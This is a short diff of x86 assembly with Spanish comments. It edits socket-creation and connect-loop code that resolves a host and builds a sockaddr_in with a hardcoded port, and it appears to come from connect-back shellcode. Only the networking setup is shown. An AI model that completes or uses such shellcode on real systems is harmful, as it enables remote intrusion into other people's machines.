@@ -375,7 +375,7 @@ _cont:  xor  eax, eax                   //EAX = 0
 
 newSocket:
         //Creamos el socket AF_INET y SOCK_STREAM
-        cdq                             //EDX = 0    (Si EAX >=0; WSAStartup siempre devuelve >=0)
+        xor  edx, edx                   //EDX = 0
         push edx                        //v
         push edx                        //v
         push edx                        //v
@@ -407,7 +407,6 @@ connect_loop:
         push eax                        //v
         call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);
 
-//#define PORT 0xD0070002
 #define PORT 0x932B0002
         //Construimos la sockaddr_in en la pila
         push eax                        //push IP
